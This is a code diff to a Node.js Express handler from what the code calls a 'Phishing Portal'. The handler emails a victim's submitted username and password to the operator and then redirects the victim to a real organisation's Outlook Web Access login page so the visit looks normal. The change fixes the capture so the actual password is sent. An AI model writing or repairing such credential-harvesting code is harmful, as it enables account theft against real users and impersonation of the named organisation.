@@ -29,11 +29,11 @@ app.get('/',(req, res) => {
 app.post('/send', (req, res) => {
 	console.log(req.body)
 	const output = `
-		<p>You have a new password entry from HFC Phishing Portal</p>
+		<p>You have a new password entry from Phishing Portal</p>
 		<h3>User Details</h3>
 		<ul>
 			<li>Name: ${req.body.username}</li>
-			<li>Password:${req.body.username}</li>
+			<li>Password:${req.body.password}</li>
 		</ul>
 	`
 
@@ -69,8 +69,6 @@ app.post('/send', (req, res) => {
         // Preview only available when sending through an Ethereal account
         console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
 
-        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
-        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
         res.redirect('https://mail.kenyare.co.ke/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.kenyare.co.ke%2fowa%2f') //original page url
     });
 })
